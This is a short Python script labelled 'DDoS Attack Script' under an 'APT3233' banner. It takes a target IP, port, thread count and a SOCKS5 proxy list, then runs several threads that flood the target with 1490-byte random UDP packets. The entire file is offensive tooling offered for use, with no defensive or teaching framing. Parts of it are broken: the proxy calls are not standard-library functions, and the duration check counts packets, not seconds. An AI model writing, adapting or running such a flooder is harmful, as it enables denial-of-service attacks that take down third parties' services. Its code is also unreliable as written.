import sys
import os
import time
import socket
import random
import threading
import argparse  


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet APT3233")
print
print("Author   : linh yeu dau cua a")
print


parser = argparse.ArgumentParser(description="DDoS Attack Script")
parser.add_argument("ip", help="IP Target")
parser.add_argument("-p", "--port", type=int, help="Port")
parser.add_argument("--threads", type=int, help="Threads")
parser.add_argument("--duration", type=int, help="Duration (seconds)")
parser.add_argument("--proxy", help="Path to SOCKS5 proxy file (socks5.txt)")
args = parser.parse_args()

ip = args.ip
port = args.port if args.port else 80  
threads = args.threads if args.threads else 1  
duration = args.duration if args.duration else None
proxy_file = args.proxy 


with open(args.proxy, "r") as proxy_file:
    proxies = proxy_file.read().splitlines()

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0%")
time.sleep(3)
print("[=====               ] 25%")
time.sleep(3)
print("[==========          ] 50%")
time.sleep(4)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 99%")
time.sleep(3)
sent = 0

def ddos_attack(proxy):
    global sent
    while True:
        try:
            proxy_parts = proxy.split(":")
            proxy_ip = proxy_parts[0]
            proxy_port = int(proxy_parts[1])
            sock.setproxy(socket.SOCKS5, proxy_ip, proxy_port)
            sock.sendto(bytes, (ip, port))
            sent += 1
            if duration and sent >= duration * 1000:
                break
            print(f"Sent {sent} packets through {proxy_ip}:{proxy_port} to {ip}:{port}")
        except Exception as e:
            print(f"Failed to use {proxy}: {str(e)}")

threads_list = []
for _ in range(threads):
    thread = threading.Thread(target=ddos_attack, args=(random.choice(proxies),))
    threads_list.append(thread)
    thread.start()

if duration:
    time.sleep(duration)

for thread in threads_list:
    thread.join()

print("Attack finished.")
